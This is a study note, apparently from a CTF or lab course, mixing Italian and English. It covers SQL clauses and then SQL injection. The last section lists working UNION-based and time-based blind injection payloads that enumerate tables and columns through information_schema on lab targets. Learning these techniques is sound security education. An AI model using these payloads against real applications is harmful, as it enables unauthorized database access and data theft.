# SQL
SQL Injection Introduction [here](http://web-17.challs.olicyber.it/)

Query exercises [here](https://www.sql-practice.com/)

### BETWEEN
Il primo dato deve essere il limite inferiore, il secondo il superiore, non viceversa.

> I limiti sono compresi: <br>
> ` BETWEEN 4 AND 10 ` comprende sia 4 che 10
> 
### IN
Al posto di usare molteplici ` OR ` uso un ` IN `; esso mi consente di cercare un valore in una lista di valori.

```sql
    SELECT ... WHERE name IN ('Sara','Vanessa','Marta','Giulia')
```

> Oltre al costrutto ` IN ` esiste anche il ` NOT IN `

### CONCAT
Permette di concatenare più stringhe
```sql
    SELECT CONCAT(FirstName, ', ' , City) FROM customers;
```
### UPPER and LOWER
The **UPPER** function converts all letters in the specified string to uppercase.
The **LOWER** function converts the string to lowercase.

```sql
    SELECT FirstName, UPPER(LastName) AS LastName FROM employees;
```
### UNION
`UNION` in SQL concat two or more `SELECT`, without the `ALL` keyword it consider all values once, so the duplicate will be delete.

> All the select in a UNION must have the same number of column

```sql
    SELECT ID, FirstName, LastName, City FROM First
    UNION ALL
    SELECT ID, FirstName, LastName, City FROM Second;
```
### SQL Injection
- database() return the name of the database

```sql
    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
Una volta trovato il nome del database posso cercare tutte le tabelle che appartengono a questo database
*There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.*

```sql
    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
    https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four';--
    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
    username
```
